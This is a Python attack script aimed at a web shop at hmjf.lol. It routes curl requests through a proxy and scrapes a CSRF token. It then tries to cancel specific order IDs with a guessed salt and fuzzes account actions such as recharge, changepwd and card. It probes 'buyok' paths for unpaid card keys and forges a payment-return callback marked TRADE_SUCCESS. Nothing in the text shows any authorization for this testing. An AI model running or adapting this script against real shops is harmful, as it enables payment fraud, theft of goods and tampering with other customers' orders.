#!/usr/bin/env python3
import subprocess, re, os, json

PX = [l.split("=", 1)[1].strip().strip('"') for l in open("/data/config/proxy.env") if l.startswith("PROXY_URL=")][0]
UA = "Mozilla/5.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
CK = "/tmp/cancel.ck"
HS = "256"

def c(url, post=None):
    cmd = ["curl", "-s", "--max-time", "15", "-x", PX, "-A", UA, "-H", f"Referer: {REF}", "-b", CK, "-c", CK]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout

if os.path.exists(CK):
    os.remove(CK)
c(f"{B}/?mod=buy&tid=72")
page = c(f"{B}/?mod=buy&tid=72")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page).group(1)

print("=== cancel bypass test ===")
for oid in ["20260716031217345", "20260716030008400", "20260716025337303"]:
    for field in ["orderid", "trade_no"]:
        post = f"{field}={oid}&hashsalt={HS}&csrf_token={csrf}"
        r = c(f"{B}/ajax.php?act=cancel", post=post)
        print(field, oid[:8], "->", r.strip()[:100])

print("\n=== user/ajax.php acts ===")
acts = ["login", "order", "query", "info", "shop", "record", "recharge", "changepwd", "list", "kami", "card"]
for act in acts:
    r = c(f"{B}/user/ajax.php?act={act}", post="")
    if r.strip() and r.strip() != '{"code":403}':
        print(act, r[:150])

print("\n=== buyok / mod fuzz ===")
for path in ["?buyok=1", "?mod=buyok", "?mod=order&buyok=1", "?mod=query&buyok=1"]:
    r = c(f"{B}/{path}")
    if "kminfo" in r.lower() or ("成功" in r and "未付款" not in r):
        print("HIT", path, r[:200])

print("\n=== epay_return redirect ===")
r = c(f"{B}/other/epay_return.php?out_trade_no=20260716031217345&trade_status=TRADE_SUCCESS")
print("return", r[:200])
if "location" in r.lower() or "href" in r:
    loc = re.search(r'location\.href\s*=\s*["\']([^"\']+)', r, re.I)
    if loc:
        print("redirect", loc.group(1))
